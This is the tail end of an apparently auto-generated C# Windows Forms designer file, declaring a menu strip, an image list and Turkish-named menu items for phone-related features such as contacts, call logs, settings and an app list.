        private System.Windows.Forms.ToolStripMenuItem rehberToolStripMenuItem;
        private System.Windows.Forms.ImageList ımageList1;
        private System.Windows.Forms.ToolStripMenuItem çağrıKayıtlarıToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem telefonAyarlarıToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem uygulamaListesiToolStripMenuItem;
        private System.Windows.Forms.MenuStrip menuStrip1;
        private System.Windows.Forms.ToolStripMenuItem oluşturToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem ayarlarToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem hakkındaToolStripMenuItem;
        private System.Windows.Forms.ToolStripMenuItem telefonDurumuToolStripMenuItem;
    }
}

